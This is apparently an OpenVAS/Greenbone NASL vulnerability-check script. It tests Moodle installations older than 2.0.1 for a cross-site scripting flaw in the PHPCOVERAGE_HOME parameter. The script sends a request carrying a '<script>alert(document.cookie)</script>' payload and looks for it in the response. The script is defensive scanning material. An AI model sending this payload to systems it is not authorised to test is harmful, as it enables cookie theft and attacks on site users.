if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103056" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-02-02 13:26:27 +0100 (Wed, 02 Feb 2011)" );
	script_bugtraq_id( 46085 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "Moodle 'PHPCOVERAGE_HOME' Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/46085" );
	script_xref( name: "URL", value: "http://www.moodle.org" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_moodle_cms_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "moodle/detected" );
	script_tag( name: "summary", value: "Moodle is prone to a cross-site scripting vulnerability because it
  fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this vulnerability may allow an attacker to perform cross-
  site scripting attacks on unsuspecting users in the context of the
  affected website. As a result, the attacker may be able to steal cookie-
  based authentication credentials and to launch other attacks." );
	script_tag( name: "affected", value: "Versions prior to Moodle 2.0.1 are vulnerable." );
	script_tag( name: "solution", value: "Upgrade to the latest version." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
CPE = "cpe:/a:moodle:moodle";
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = NASLString( dir, "/lib/spikephpcoverage/src/phpcoverage.remote.top.inc.php?PHPCOVERAGE_HOME=<script>alert(document.cookie)</script>" );
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(document.cookie\\)</script>", check_header: TRUE, extra_check: make_list( "ERROR: Could not locate PHPCOVERAGE_HOME" ) )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

